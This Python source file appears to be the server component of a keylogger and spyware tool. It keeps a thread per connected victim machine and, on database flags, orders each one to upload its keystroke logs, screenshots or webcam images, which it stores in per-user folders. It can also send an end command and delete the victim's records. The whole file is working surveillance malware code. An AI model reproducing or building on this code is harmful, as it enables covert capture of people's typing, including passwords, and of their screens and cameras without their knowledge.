import hashlib
import smtplib
import os
import threading
import json
from time import sleep
import shutil
from datetime import datetime

LOCKS = {}
PATH = os.path.dirname(__file__)
USERS_PATH = os.path.join(PATH, "Users")
print(USERS_PATH)


class Client(threading.Thread):
    def __init__(self, client_socket, ip, client):
        threading.Thread.__init__(self)
        self.client_path = client.path
        self.id = client.id
        self.client = client
        self.client_socket = client_socket
        self.ip = ip
        self._running = True
        LOCKS[self.id] = threading.Lock()

    def run(self):
        """

        starts the process with the client after the server ended the start process with it (in the server's run function)

        :return: none
        """
        # The procces for a normal client (keylogger client)
        threading.Thread.__init__(self)

        print("client that we found through the db -  ", self.client_socket)

        self.parameters_dealer()

        try:
            print("IS IT RUNNING???????:", self._running)
            while self._running:
                LOCKS[self.id].acquire()
                self.client_socket.send(b"aaa")
                LOCKS[self.id].release()
                sleep(0.5)
        except Exception as e:
            print(e)
            # LOCKS.pop(self.ip)
            client_dic.pop(self.id)

        if self.id in client_dic.keys():
            client_dic.pop(self.id)
        LOCKS.pop(self.id)
        return

    def parameters_dealer(self):
        """
        Handles the parameters sent to the client
        :param client_socket: socket obj
        :param temp_path: str path of place in USER_PATH dir
        :param ip: str ip of user
        :return: None
        """
        # Handles any stuff that needs to be sent to the server from the client
        client = User.query.filter_by(id=self.id).first()
        if client.log:
            # enters the sending logs procces
            self.transport_info(logs=True)
            client.log = False

        if client.img:
            # enters the sending image procces
            self.transport_info(image=True)
            client.img = False

        if client.web:
            self.transport_info(web=True)
            client.web = False

        if client.end:
            self.end()
            self._running = False
        db.session.commit()

    def transport_info(self, logs=False, image=False, web=False):
        try:
            """
            Sends info of the specific action from client to the server
            :param path: str path
            :param client_socket: socket obj
            :param logs: Bool
            :param image: Bool
            :return: None
            """
            # get info precess - sends True to start the transportation --> stuck in a while loop to get all of the info until identifies the last words "end"
            if logs:
                self.client_socket.send(b'log')
            elif image:
                self.client_socket.send(b'img')
            elif web:
                self.client_socket.send(b'web')

            LOCKS[self.id].acquire()
            print("acquire lock")
            confirmation = self.client_socket.recv(5)
            if confirmation != b"start":
                LOCKS[self.id].release()
                print("woopsie")
                return False

            self.client_socket.send(b"True")
            print("sent True")
            num = self.client_socket.recv(1).decode()

            ln = ""
            while num != "-":
                # gets length of file
                ln += num
                num = self.client_socket.recv(1).decode()
            print(ln)
            # img = data received through the client
            img = self.client_socket.recv(int(ln))
            print(len(img))
            while len(img) != int(ln):
                # in case it didnt get all of the data in one go
                img += self.client_socket.recv(int(ln) - len(img))
                print("went through the length fixer")

            if logs:

                log_path = os.path.join(self.client_path, "logs.txt")
                print("log_path =  " + log_path)
                try:
                    with open(log_path, 'rb') as r:
                        log = r.read()
                    with open(log_path, 'wb') as screen_shot:
                        screen_shot.write(log)
                        screen_shot.write(img)
                        screen_shot.close()
                except:
                    print("Exeption, file doesn't exist")
                    with open(log_path, 'wb') as screen_shot:
                        screen_shot.write(img)
                        screen_shot.close()

            elif image:
                pic_path = os.path.join(self.client_path, "images")
                if not os.path.isdir(pic_path):
                    os.mkdir(pic_path)
                pic_path = os.path.join(pic_path, request_time() + ".jpg")
                print(pic_path)
                with open(pic_path, 'wb') as screen_shot:
                    screen_shot.write(img)
                    screen_shot.close()

            elif web:
                pic_path = os.path.join(self.client_path, "webcam")
                if not os.path.isdir(pic_path):
                    os.mkdir(pic_path)
                pic_path = os.path.join(pic_path, request_time() + ".jpg")
                print(pic_path)
                with open(pic_path, 'wb') as screen_shot:
                    screen_shot.write(img)
                    screen_shot.close()

            LOCKS[self.id].release()
            print("finished job")
            return True
        except Exception as e:
            print(e)
            client_dic.pop(self.id)
            LOCKS.pop(self.id)
            return False

    def end(self):
        """
        End process of client
        :param client_socket: socket obj
        :param ip: str ip
        :return: None
        """
        self.client_socket.send(b"end")

        client = User.query.filter_by(id=self.id).first()
        path = client.path
        print(path)
        User.query.filter_by(id=self.id).delete()
        db.session.commit()
        shutil.rmtree(path, ignore_errors=True)
        self._running = False


def request_time():
    """

    :return:
    """
    current_date_and_time = datetime.now()
    current_date_and_time.strftime("%d-%m-%Y %H_%M_%S")
    return current_date_and_time.strftime("%m-%d-%Y %H_%M_%S")


def main(client_dictionary, database, user):
    global client_dic, db, User
    db = database
    User = user
    client_dic = client_dictionary
